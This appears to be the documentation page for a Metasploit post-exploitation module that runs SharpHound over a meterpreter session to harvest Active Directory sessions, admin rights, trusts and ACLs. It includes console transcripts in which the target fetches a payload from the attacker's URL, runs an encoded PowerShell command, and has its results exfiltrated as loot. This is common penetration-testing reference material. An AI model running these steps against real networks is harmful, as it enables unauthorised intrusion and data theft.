## Vulnerable Application

This module will execute the BloodHound C# Ingestor (aka SharpHound) to gather sessions, local admin, domain trusts and more.
With this information BloodHound will easily identify highly complex privilage elevation attack paths that would otherwise be
impossible to quickly identify within an Active Directory environment.

This module can take several/many minutes to run due to the volume of data being collected.

## Verification Steps

  1. Start `msfconsole`
  2. Get meterpreter session on a Windows domain
  3. Do: `use post/windows/gather/bloodhound`
  4. Do: `set SESSION <session id>`
  5. Do: `run`
  6. You should be able to see that the module is running a powershell in the target machine
  7. You should be able to see, after few minutes, that the module created a loot with the BloodHound results in zip format

## Options

### Method

Which method to use to get shaphound running.  Default is `download`.

  1. `download` requires the compromised host to have connectivity back to metasploit to download and execute the
      payload.  Sharphound is not written to disk.
  2. `disk` requires admin privileges to bypass the execution policy (if it isn't open).  Writes the `sharphound.exe`
     file to disk.  No connectivity is required but a disk write does happen which is likely to get caught by AV.

### CollectionMethode

The collection method to use. This parameter accepts a comma separated list of values. Accepted values are `Default`, `Group`,
`LocalAdmin`, `RDP`, `DCOM`, `GPOLocalGroup`, `Session`, `ObjectProps`, `ComputerOnly`, `LoggedOn`, `Trusts`, `ACL`, `Container`,
`DcOnly`, `All`.  The default method is `Default`.

### Domain

Specifies the domain to enumerate. If not specified, will enumerate the current domain your user context specifies.

### Stealth

Use stealth collection options, will sacrifice data quality in favor of much reduced network impact. The default value is `false`.

### ExcludeDomainControllers

Exclude domain controllers from session queries. Useful for ATA environments which detect this behavior. The default value is `false`.

### DomainController

Specify which Domain Controller to request data from. Defaults to closest DC using Site Names.

### LdapPort

Override the port used to connect to LDAP.

### SecureLdap

Uses LDAPs instead of unencrypted LDAP on port 636. The default value is `false`.

### DisableKerbSigning

Disables Kerberos Signing on requests. The default value is `false`.

### SkipPing

Skip all ping checks for computers. This option will most likely be slower as API calls will be made to all computers regardless of
being up Use this option if ping is disabled on the network for some reason. The default value is `false`.

### OutputFolder

Folder to write the JSON output to.  Default is to enumerate the Windows Temp folder.

### EncryptZip

If the zip should be encrypted by SharpHound using a random password.  Password is stored to `notes`, default is `true`.

### NoSaveCache

If the cache file (.bin) should NOT be written to disk.  Default is `true`.

## Scenarios

```
meterpreter > run post/windows/gather/bloodhound

[*] Using URL: http://0.0.0.0:8080/bvqUdtHUQ4De1O3
[*] Local IP: http://192.168.1.136:8080/bvqUdtHUQ4De1O3
[*] Invoking BloodHound with: Invoke-BloodHound -CollectionMethod Default -Threads 10 -JSONFolder "C:\Windows\TEMP" -PingTimeout 250 -LoopDelay 300 
[*] Initializing BloodHound at 6:44 AM on 4/29/2019
[*] Resolved Collection Methods to Group, LocalAdmin, Session, Trusts
[*] Starting Enumeration for uplift.local
[*] Status: 58 objects enumerated (+58 �/s --- Using 58 MB RAM )
[*] Finished enumeration for uplift.local in 00:00:00.6365050
[*] 0 hosts failed ping. 0 hosts timedout.
[*] 
[*] Compressing data to C:\Windows\TEMP\20190429064444_BloodHound.zip.
[*] You can upload this file directly to the UI.
[*] Finished compressing files!
```

### Windows 10 non-AD host, Windows Server 2012 AD, Disk Method

```
meterpreter > sysinfo
Computer        : WIN10PROLICENSE
OS              : Windows 10 (10.0 Build 16299).
Architecture    : x64
System Language : en_US
Domain          : hoodiecola
Logged On Users : 7
Meterpreter     : x86/windows
meterpreter > background
[*] Backgrounding session 1...
msf5 post(windows/gather/bloodhound) > set method disk
method => disk
msf5 post(windows/gather/bloodhound) > exploit

[*] Uploading sharphound.exe as C:\Users\user\Desktop\qehojlwml.exe
[*] Loading BloodHound with: . C:\Users\user\Desktop\qehojlwml.exe --outputdirectory "C:\Users\user\AppData\Local\Temp" --zipfilename eiqxerh --encryptzip --nosavecache 
[+] EXECUTING:
powershell.exe -EncodedCommand LgAgAEMAOgBcAFUAcwBlAHIAcwBcAHQAYQByAGEAXABEAGUAcwBrAHQAbwBwAFwAcQBlAGgAbwBqAGwAdwBtAGwALgBlAHgAZQAgAC0ALQBvAHUAdABwAHUAdABkAGkAcgBlAGMAdABvAHIAeQAgACIAQwA6AFwAVQBzAGUAcgBzAFwAdABhAHIAYQBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwACIAIAAtAC0AegBpAHAAZgBpAGwAZQBuAGEAbQBlACAAZQBpAHEAeABlAHIAaAAgAC0ALQBlAG4AYwByAHkAcAB0AHoAaQBwACAALQAtAG4AbwBzAGEAdgBlAGMAYQBjAGgAZQAgADsAIAA= -InputFormat None
[*] ----------------------------------------------
[*] Initializing SharpHound at 4:19 PM on 6/3/2020
[*] ----------------------------------------------
[*] 
[*] Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
[*] 
[*] [+] Creating Schema map for domain HOODIECOLA.COM using path CN=Schema,CN=Configuration,DC=HOODIECOLA,DC=COM
[*] [+] Cache File not Found: 0 Objects in cache
[*] 
[*] [+] Pre-populating Domain Controller SIDS
[*] Status: 0 objects finished (+0) -- Using 19 MB RAM
[*] Status: 63 objects finished (+63 21)/s -- Using 26 MB RAM
[*] Enumeration finished in 00:00:03.3219377
[*] Compressing data to C:\Users\user\AppData\Local\Temp\20200603161905_eiqxerh.zip
[*] Password for Zip file is QEqUpTtU0v. Unzip files manually to upload to interface
[*] 
[*] SharpHound Enumeration Completed at 4:19 PM on 6/3/2020! Happy Graphing!
[*] 
[+] Downloaded C:\Users\user\AppData\Local\Temp\20200603161905_eiqxerh.zip: /metasploit/.msf4/loot/20200603192705_default_2.2.2.2_windows.ad.blood_749446.zip
[+] Zip password: QEqUpTtU0v
[*] Deleting C:\Users\user\Desktop\qehojlwml.exe
[*] Post module execution completed

msf5 post(windows/gather/bloodhound) > notes

Notes
=====

 Time                     Host          Service  Port  Protocol  Type                     Data
 ----                     ----          -------  ----  --------  ----                     ----
 2020-06-03 23:27:05 UTC  2.2.2.2                           Sharphound Zip Password  "Bloodhound/Sharphound loot /metasploit/.msf4/loot/20200603192705_default_2.2.2.2_windows.ad.blood_749446.zip password is QEqUpTtU0v"

```
